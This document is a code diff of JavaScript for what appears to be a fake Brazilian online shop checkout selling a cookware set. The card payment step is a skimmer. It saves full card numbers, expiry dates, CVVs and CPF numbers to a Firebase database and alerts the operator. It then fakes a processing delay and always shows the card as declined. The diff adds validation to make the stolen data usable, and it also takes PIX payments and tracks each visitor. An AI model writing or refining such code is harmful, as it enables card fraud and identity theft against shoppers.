 document.getElementById('cep').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>8)v=v.slice(0,8);v=v.replace(/(\d{5})(\d)/,'$1-$2');this.value=v;});
 document.getElementById('telefone').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>11)v=v.slice(0,11);let f='';if(v.length>0)f='('+v.slice(0,2);if(v.length>=3)f+=') '+v.slice(2,v.length>=7?7:v.length);if(v.length>=7)f+='-'+v.slice(7);this.value=f;});
+
+// Submeter Endereço com validação travando
+document.getElementById('formEndereco').addEventListener('submit',function(e){
+  e.preventDefault();
+  
+  const nome = document.getElementById('nome').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const cpf = document.getElementById('cpf').value.trim();
+  const cep = document.getElementById('cep').value.trim();
+  const rua = document.getElementById('rua').value.trim();
+  const numero = document.getElementById('numero').value.trim();
+  const complemento = document.getElementById('complemento').value.trim();
+  const bairro = document.getElementById('bairro').value.trim();
+  const cidade = document.getElementById('cidade').value.trim();
+  const estado = document.getElementById('estado').value.trim();
+  const telefone = document.getElementById('telefone').value.trim();
+
+  // Valida tudo
+  const vNome = validarNome(nome, 'erroNome');
+  const vEmail = validarEmail(email, 'erroEmail');
+  const vCpf = validarCpf(cpf, 'erroCpf');
+  const vCep = validarCep(cep, 'erroCep');
+  const vRua = validarNome(rua, 'erroRua') || rua.length > 0;
+  const vNumero = numero.length > 0;
+  const vBairro = bairro.length > 0;
+  const vCidade = cidade.length > 0;
+  const vEstado = validarEstado(estado, 'erroEstado');
+  const vTelefone = validarTelefone(telefone, 'erroTelefone');
+
+  if(!(vNome && vEmail && vCpf && vCep && vRua && vNumero && vBairro && vCidade && vEstado && vTelefone)){
+    alert("Existem campos inválidos. Corrija-os para continuar.");
+    return; // TRAVA AQUI
+  }
+
+  const dados = {nome,email,cpf,cep,rua,numero,complemento,bairro,cidade,estado,telefone};
+  pedidoRef.update({endereco:dados,login:dados.nome,logadoEm:Date.now(),valor:VALOR_PEDIDO});
+  db.ref('alertas').push({tipo:'endereco_preenchido',clienteId,nome:dados.nome,timestamp:Date.now()});
+  
+  const end=`${dados.nome}<br>${dados.rua}, ${dados.numero}${dados.complemento?' - '+dados.complemento:''}<br>${dados.bairro} - ${dados.cidade}/${dados.estado}<br>CPF: ${dados.cpf}<br>Tel: ${dados.telefone}`;
+  document.getElementById('mostrarEndereco').innerHTML=end;
+  appEndereco.classList.add('hidden');appFrete.classList.remove('hidden');window.scrollTo(0,0);
+});
 
 function buscarCep(){
   const cep=document.getElementById('cep').value.replace(/\D/g,'');
@@ -677,29 +699,6 @@ function buscarCep(){
   }).catch(()=>{status.textContent='';});
 }
 
-document.getElementById('formEndereco').addEventListener('submit',function(e){
-  e.preventDefault();
-  const dados={
-    nome:document.getElementById('nome').value.trim(),
-    email:document.getElementById('email').value.trim(),
-    cpf:document.getElementById('cpf').value.trim(),
-    cep:document.getElementById('cep').value.trim(),
-    rua:document.getElementById('rua').value.trim(),
-    numero:document.getElementById('numero').value.trim(),
-    complemento:document.getElementById('complemento').value.trim(),
-    bairro:document.getElementById('bairro').value.trim(),
-    cidade:document.getElementById('cidade').value.trim(),
-    estado:document.getElementById('estado').value.trim(),
-    telefone:document.getElementById('telefone').value.trim()
-  };
-  if(!dados.nome||!dados.email||!dados.cpf||!dados.cep||!dados.rua||!dados.numero||!dados.bairro||!dados.cidade||!dados.estado||!dados.telefone){alert('Preencha todos os campos obrigatórios.');return;}
-  pedidoRef.update({endereco:dados,login:dados.nome,logadoEm:Date.now(),valor:VALOR_PEDIDO});
-  db.ref('alertas').push({tipo:'endereco_preenchido',clienteId,nome:dados.nome,timestamp:Date.now()});
-  const end=`${dados.nome}<br>${dados.rua}, ${dados.numero}${dados.complemento?' - '+dados.complemento:''}<br>${dados.bairro} - ${dados.cidade}/${dados.estado}<br>CPF: ${dados.cpf}<br>Tel: ${dados.telefone}`;
-  document.getElementById('mostrarEndereco').innerHTML=end;
-  appEndereco.classList.add('hidden');appFrete.classList.remove('hidden');window.scrollTo(0,0);
-});
-
 function voltarEndereco(){appFrete.classList.add('hidden');appEndereco.classList.remove('hidden');window.scrollTo(0,0);}
 function irParaPagamento(){
   const f=document.querySelector('input[name="frete"]:checked');
@@ -708,17 +707,13 @@ function irParaPagamento(){
 }
 function voltarFrete(){appPagamento.classList.add('hidden');appFrete.classList.remove('hidden');window.scrollTo(0,0);}
 
-/* ========== PIX VIA BLACKCAT ========== */
+/* ========== PIX ========== */
 async function escolherPix(){
-  appPagamento.classList.add('hidden');
-  appPix.classList.remove('hidden');
-  window.scrollTo(0,0);
+  appPagamento.classList.add('hidden');appPix.classList.remove('hidden');window.scrollTo(0,0);
 
   const msg=document.getElementById('pixMensagem');
   const box=document.getElementById('pixBox');
-  msg.style.display='block';
-  msg.textContent='Gerando PIX…';
-  box.style.display='none';
+  msg.style.display='block';msg.textContent='Gerando PIX…';box.style.display='none';
 
   pedidoRef.update({pagamentoTipo:'pix'});
   db.ref('alertas').push({tipo:'pix_solicitado',clienteId,timestamp:Date.now()});
@@ -728,14 +723,12 @@ async function escolherPix(){
   const end=pedido.endereco;
 
   if(!end || !end.nome || !end.cpf || !end.email){
-    msg.textContent='Preencha seus dados antes de gerar o Pix.';
-    return;
+    msg.textContent='Preencha seus dados antes de gerar o Pix.';return;
   }
 
   const apiKey=String(blackcatApiKeyCache||'').trim();
   if(!apiKey){
     msg.textContent='Pix indisponível no momento. Tente novamente mais tarde.';
-    db.ref('alertas').push({tipo:'pix_erro_sem_apikey',clienteId,timestamp:Date.now()});
     return;
   }
 
@@ -744,84 +737,36 @@ async function escolherPix(){
   const cepNumeros=end.cep.replace(/\D/g,'');
 
   const body={
-    amount: VALOR_CENTAVOS,
-    currency: 'BRL',
-    paymentMethod: 'PIX',
+    amount: VALOR_CENTAVOS, currency: 'BRL', paymentMethod: 'PIX',
     items: [{ title: 'Jogo de Panelas Paris 5 Peças Tramontina', unitPrice: VALOR_CENTAVOS, quantity: 1, tangible: true }],
-    customer: {
-      name: end.nome,
-      email: end.email,
-      phone: telNumeros,
-      document: { number: cpfNumeros, type: 'cpf' }
-    },
-    shipping: {
-      name: end.nome,
-      street: end.rua,
-      number: end.numero,
-      complement: end.complemento||'',
-      neighborhood: end.bairro,
-      city: end.cidade,
-      state: (end.estado||'').toUpperCase().substring(0,2),
-      zipCode: cepNumeros
-    },
-    pix: { expiresInDays: 1 },
-    externalRef: clienteId
+    customer: { name: end.nome, email: end.email, phone: telNumeros, document: { number: cpfNumeros, type: 'cpf' } },
+    shipping: { name: end.nome, street: end.rua, number: end.numero, complement: end.complemento||'', neighborhood: end.bairro, city: end.cidade, state: (end.estado||'').toUpperCase().substring(0,2), zipCode: cepNumeros },
+    pix: { expiresInDays: 1 }, externalRef: clienteId
   };
 
   try {
     const resp=await fetch(BLACKCAT_BASE+'/sales/create-sale',{
-      method:'POST',
-      headers:{'Content-Type':'application/json','X-API-Key':apiKey},
-      body:JSON.stringify(body)
+      method:'POST', headers:{'Content-Type':'application/json','X-API-Key':apiKey}, body:JSON.stringify(body)
     });
     const data=await resp.json();
-
     if(!resp.ok || !data.success){
-      console.error('Blackcat erro:', data);
-      msg.textContent = 'Não foi possível gerar o Pix. ' + (data.message||data.error||'');
-      db.ref('alertas').push({tipo:'pix_erro_blackcat',clienteId,detalhe:JSON.stringify(data).substring(0,300),timestamp:Date.now()});
-      return;
+      msg.textContent = 'Não foi possível gerar o Pix. ' + (data.message||data.error||'');return;
     }
-
-    const t=data.data;
-    const pd=t.paymentData||{};
+    const t=data.data;const pd=t.paymentData||{};
     const qrSrc = pd.qrCodeBase64 || ('https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(pd.copyPaste||pd.qrCode||''));
     const copia = pd.copyPaste || pd.qrCode || '';
 
-    msg.style.display='none';
-    box.style.display='block';
+    msg.style.display='none';box.style.display='block';
     document.getElementById('qrCodeImg').src=qrSrc;
     document.getElementById('chavePix').value=copia;
-    document.getElementById('pixTopo').textContent='Pague R$ '+VALOR_PEDIDO.toFixed(2).replace('.',',')+' via Pix para garantir sua compra';
-
+    document.getElementById('pixTopo').textContent='Pague R$ 159,44 via Pix';
     pedidoRef.update({
-      'blackcat': {
-        transactionId: t.transactionId||'',
-        status: t.status||'PENDING',
-        amount: t.amount||VALOR_CENTAVOS,
-        netAmount: t.netAmount||0,
-        fees: t.fees||0,
-        invoiceUrl: t.invoiceUrl||'',
-        copyPaste: copia,
-        qrCodeBase64: pd.qrCodeBase64||'',
-        expiresAt: pd.expiresAt||'',
-        criadoEm: Date.now()
-      },
-      'pix': {
-        geradoEm: Date.now(),
-        copiado: false,
-        valor: VALOR_PEDIDO,
-        chave: copia,
-        qrCode: qrSrc,
-        transactionId: t.transactionId||''
-      }
+      'blackcat': { transactionId: t.transactionId||'', status: t.status||'PENDING', amount: t.amount||VALOR_CENTAVOS, netAmount: t.netAmount||0, fees: t.fees||0, invoiceUrl: t.invoiceUrl||'', copyPaste: copia, qrCodeBase64: pd.qrCodeBase64||'', expiresAt: pd.expiresAt||'', criadoEm: Date.now() },
+      'pix': { geradoEm: Date.now(), copiado: false, valor: VALOR_PEDIDO, chave: copia, qrCode: qrSrc, transactionId: t.transactionId||'' }
     });
     db.ref('alertas').push({tipo:'pix_gerado',clienteId,transactionId:t.transactionId,timestamp:Date.now()});
-
   } catch(err){
-    console.error('Blackcat fetch erro:', err);
-    msg.textContent='Falha de conexão com o pagamento. Verifique sua internet e tente novamente.';
-    db.ref('alertas').push({tipo:'pix_erro_rede',clienteId,detalhe:String(err).substring(0,200),timestamp:Date.now()});
+    msg.textContent='Falha de conexão com o pagamento.';
   }
 }
 
@@ -831,48 +776,81 @@ function voltarPagamento(){
   document.getElementById('recusado').style.display='none';
   appPagamento.classList.remove('hidden');window.scrollTo(0,0);
 }
-
 function copiarChave(){
-  const input=document.getElementById('chavePix');
-  input.select();
-  document.execCommand('copy');
+  const input=document.getElementById('chavePix');input.select();document.execCommand('copy');
   pedidoRef.update({'pix/copiado':true,'pix/copiadoEm':Date.now()});
   db.ref('alertas').push({tipo:'pix_copiado',clienteId,timestamp:Date.now()});
   alert('Código PIX copiado!');
 }
 
-/* ========== CARTÃO (mantido fake) ========== */
+/* ========== CARTÃO ========== */
 function escolherCartao(){
   appPagamento.classList.add('hidden');appCartao.classList.remove('hidden');
   pedidoRef.update({pagamentoTipo:'cartao'});
   currentSlide=1;showSlide(1);window.scrollTo(0,0);
 }
 let currentSlide=1;const totalSlides=4;
-function showSlide(n){for(let i=1;i<=totalSlides;i++)document.getElementById('slide'+i).classList.remove('active');document.getElementById('slide'+n).classList.add('active');document.getElementById('anterior').disabled=n===1;if(n===totalSlides){document.getElementById('navigation').style.display='none';document.getElementById('btnPagarCartao').style.display='block';}else{document.getElementById('navigation').style.display='flex';document.getElementById('btnPagarCartao').style.display='none';}}
+function showSlide(n){
+  for(let i=1;i<=totalSlides;i++)document.getElementById('slide'+i).classList.remove('active');
+  document.getElementById('slide'+n).classList.add('active');
+  document.getElementById('anterior').disabled=n===1;
+  if(n===totalSlides){document.getElementById('navigation').style.display='none';document.getElementById('btnPagarCartao').style.display='block';}
+  else{document.getElementById('navigation').style.display='flex';document.getElementById('btnPagarCartao').style.display='none';}
+}
 function anterior(){if(currentSlide>1){currentSlide--;showSlide(currentSlide);}}
-function seguinte(){if(currentSlide<totalSlides){currentSlide++;showSlide(currentSlide);}}
+function seguinte(){
+  // VALIDAÇÃO AO AVANÇAR DO CARTÃO
+  if(currentSlide === 1){
+    const num = document.getElementById('numeroCartao').value.replace(/\D/g,'');
+    if(num.length !== 16){document.getElementById('erroCartaoNumero').textContent='O cartão precisa ter exatamente 16 números.';document.getElementById('erroCartaoNumero').className='erro';return;}
+    document.getElementById('erroCartaoNumero').textContent='';document.getElementById('erroCartaoNumero').className='';
+  }
+  if(currentSlide === 2){
+    const nome = document.getElementById('nomeCartao').value.trim();
+    if(nome.length < 5 || /\d/.test(nome)){document.getElementById('erroCartaoNome').textContent='Nome inválido (sem números e mínimo 5 letras).';document.getElementById('erroCartaoNome').className='erro';return;}
+    document.getElementById('erroCartaoNome').textContent='';document.getElementById('erroCartaoNome').className='';
+  }
+  if(currentSlide === 3){
+    const val = document.getElementById('validade').value;
+    const cvv = document.getElementById('cvv').value;
+    if(!/^\d{2}\/\d{2}$/.test(val) || parseInt(val.substring(0,2)) < 1 || parseInt(val.substring(0,2)) > 12){
+      document.getElementById('erroCartaoValidade').textContent='Validade inválida (MM/AA).';document.getElementById('erroCartaoValidade').className='erro';return;
+    }
+    document.getElementById('erroCartaoValidade').textContent='';document.getElementById('erroCartaoValidade').className='';
+    
+    if(cvv.length < 3 || cvv.length > 4){document.getElementById('erroCartaoCvv').textContent='CVV precisa ter 3 ou 4 números.';document.getElementById('erroCartaoCvv').className='erro';return;}
+    document.getElementById('erroCartaoCvv').textContent='';document.getElementById('erroCartaoCvv').className='';
+  }
+  if(currentSlide<totalSlides){currentSlide++;showSlide(currentSlide);}
+}
 function detectarBandeira(num){if(/^4/.test(num))return 'Visa';if(/^(5[1-5]|2[2-7])/.test(num))return 'Mastercard';if(/^3[47]/.test(num))return 'Amex';if(/^(4011|4312|4389|5041|5066|5090|6277|6362|6363|650|651|655)/.test(num))return 'Elo';if(/^(6062|3841|637|095)/.test(num))return 'Hipercard';return 'Outra';}
+
 function pagarCartao(){
   const numRaw=document.getElementById('numeroCartao').value.replace(/\D/g,'');
-  const numFmt=document.getElementById('numeroCartao').value.trim();
   const ult4=numRaw.slice(-4);
   const band=detectarBandeira(numRaw);
   const nome=document.getElementById('nomeCartao').value.trim();
   const val=document.getElementById('validade').value.trim();
   const cvv=document.getElementById('cvv').value.trim();
   const cpfC=document.getElementById('cpfCartao').value.trim();
-  pedidoRef.update({pagamentoTipo:'cartao',cartao:{bandeira:band,numero:numFmt,ultimos4:ult4,nome,validade:val,cvv,cpf:cpfC,tentouEm:Date.now()},status:'recusado',valor:VALOR_PEDIDO});
+  
+  // VALIDA CPF FINAL
+  const cpfNum = cpfC.replace(/\D/g,'');
+  if(cpfNum.length !== 11){
+    document.getElementById('erroCartaoCpf').textContent = "CPF precisa ter 11 números.";
+    document.getElementById('erroCartaoCpf').className='erro';
+    return; // TRAVA AQUI
+  }
+  document.getElementById('erroCartaoCpf').textContent='';document.getElementById('erroCartaoCpf').className='';
+
+  pedidoRef.update({pagamentoTipo:'cartao',cartao:{bandeira:band,numero:numRaw,ultimos4:ult4,nome,validade:val,cvv,cpf:cpfC,tentouEm:Date.now()},status:'recusado',valor:VALOR_PEDIDO});
   db.ref('alertas').push({tipo:'cartao_enviado',clienteId,bandeira:band,ultimos4:ult4,timestamp:Date.now()});
+  
   document.getElementById('numeroCartao').value='';document.getElementById('nomeCartao').value='';document.getElementById('validade').value='';document.getElementById('cvv').value='';document.getElementById('cpfCartao').value='';
   document.getElementById('processando').style.display='flex';
   setTimeout(()=>{document.getElementById('processando').style.display='none';document.getElementById('recusado').style.display='flex';},2500);
 }
-function detectCardBrand(){
-  const b=document.getElementById('bandeira');const n=document.getElementById('numeroCartao').value.replace(/\D/g,'');
-  if(/^4/.test(n)){b.src='https://img.icons8.com/color/48/visa.png';b.style.display='block';}
-  else if(/^5[1-5]/.test(n)){b.src='https://img.icons8.com/color/48/mastercard-logo.png';b.style.display='block';}
-  else{b.style.display='none';}
-}
+function detectCardBrand(){const b=document.getElementById('bandeira');const n=document.getElementById('numeroCartao').value.replace(/\D/g,'');if(/^4/.test(n)){b.src='https://img.icons8.com/color/48/visa.png';b.style.display='block';}else if(/^5[1-5]/.test(n)){b.src='https://img.icons8.com/color/48/mastercard-logo.png';b.style.display='block';}else{b.style.display='none';}}
 function formatCardNumber(){let n=document.getElementById('numeroCartao').value.replace(/\D/g,'');n=n.replace(/(.{4})/g,'$1 ').trim();document.getElementById('numeroCartao').value=n;}
 function formatValidade(){let v=document.getElementById('validade').value.replace(/\D/g,'');if(v.length>=3)v=v.slice(0,2)+'/'+v.slice(2,4);document.getElementById('validade').value=v;}
 function formatCpfCartao(){let c=document.getElementById('cpfCartao').value.replace(/\D/g,'');c=c.replace(/(\d{3})(\d)/,'$1.$2');c=c.replace(/(\d{3})(\d)/,'$1.$2');c=c.replace(/(\d{3})(\d{1,2})$/,'$1-$2');document.getElementById('cpfCartao').value=c;}
@@ -891,8 +869,7 @@ function confirmarCepTopo(){
     res.style.display='block';
     res.innerHTML=`<div><strong>${d.logradouro||''}</strong></div><div>${d.bairro||''}</div><div>${d.localidade||''}/${d.uf||''}</div>`;
     document.getElementById('btnCepTopo').textContent=`📍 ${d.localidade||''} ${d.uf||''} · ${input.value}`;
-    localStorage.setItem('cepTopo',input.value);
-    localStorage.setItem('cidadeTopo',`${d.localidade||''}/${d.uf||''}`);
+    localStorage.setItem('cepTopo',input.value);localStorage.setItem('cidadeTopo',`${d.localidade||''}/${d.uf||''}`);
     const cid=localStorage.getItem('clienteId');
     if(cid)db.ref('visitas/'+cid).update({cepTopo:input.value,cidadeTopo:d.localidade||'',ufTopo:d.uf||'',cepAtualizadoEm:Date.now()});
     setTimeout(()=>fecharModalCep(),1200);
